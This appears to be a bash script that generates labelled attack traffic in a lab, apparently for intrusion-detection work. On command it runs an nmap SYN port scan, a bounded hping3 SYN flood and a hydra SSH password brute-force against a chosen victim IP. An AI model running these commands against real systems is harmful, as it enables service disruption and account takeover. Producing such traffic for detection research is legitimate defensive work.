#!/usr/bin/env bash
# Attack traffic generator: 
# Use: attack.sh {portscan|dos|bruteforce} [victim_ip]

set -u

FAMILY="${1:?usage: attack.sh portscan|dos|bruteforce [victim_ip]}"
VICTIM="${2:-172.30.0.10}"

case "$FAMILY" in
  portscan)
    # SYN scan across 1-1024 -> many SYN-only micro-flows
    echo "[attack] portscan -> $VICTIM"
    nmap -sS -T4 -p 1-1024 "$VICTIM"
    ;;
  dos)
    # bounded SYN flood: ~15000 pkts at ~2000 pps (~8s), laptop-safe
    echo "[attack] dos (SYN flood) -> ${VICTIM}:80"
    hping3 -S -p 80 -i u500 -c 15000 "$VICTIM"
    ;;
  bruteforce)
    # SSH brute-force; wordlist ends in the real password so it succeeds
    echo "[attack] ssh brute-force -> $VICTIM"
    hydra -l victimuser -P /scripts/passwords.txt -t 4 -f -I "ssh://${VICTIM}"
    ;;
  *)
    echo "unknown family: $FAMILY" >&2; exit 2 ;;
esac
echo "[attack] $FAMILY done"